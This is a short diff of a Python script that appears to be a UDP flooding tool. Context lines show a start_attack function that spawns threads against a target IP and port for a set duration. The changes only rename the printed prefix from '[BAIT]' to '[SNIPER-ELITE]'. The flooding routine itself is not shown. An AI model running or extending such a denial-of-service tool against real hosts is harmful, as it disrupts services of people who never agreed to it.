@@ -72,7 +72,7 @@ def start_attack(target_ip, target_port, packet, thread_count, method, duration)
             th = threading.Thread(target=udp_attack, args=(target_ip, target_port, packet, duration, thread_count))
             th.start()
     else:
-        print("[BAIT] Unsupported method. Only UDP supported in this version.")
+        print("[SNIPER-ELITE] Unsupported method. Only UDP supported in this version.")
 
 # Main program flow
 def main():
@@ -87,6 +87,6 @@ if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print("\n[BAIT] Attack interrupted. Exiting...")
+        print("\n[SNIPER-ELITE] Attack interrupted. Exiting...")
         sys.exit()
 
